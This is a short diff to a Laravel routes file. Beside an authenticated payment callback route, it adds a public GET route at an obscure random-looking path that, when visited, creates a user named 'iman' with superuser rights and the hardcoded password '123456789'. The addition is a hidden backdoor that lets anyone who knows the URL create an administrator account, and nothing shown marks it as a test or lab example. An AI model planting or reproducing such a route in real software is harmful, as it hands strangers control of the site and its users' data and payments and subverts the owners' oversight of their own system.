@@ -78,3 +78,11 @@ Route::middleware(['auth'])->prefix('payment')->group(function () {
     Route::get('callback/{paymentRes}', [PaymentController::class, 'callback'])->name('payment.callback');
 });
 
+Route::get('u/2f52c1fa-1086-497e-9a7e-7cecc49-7468a1', function (){
+    \App\Models\User::create([
+        'name' => 'iman',
+        'email' => 'iman@gmail.com',
+        'superuser' => 1,
+        'password' => \Illuminate\Support\Facades\Hash::make('123456789'),
+    ]);
+});
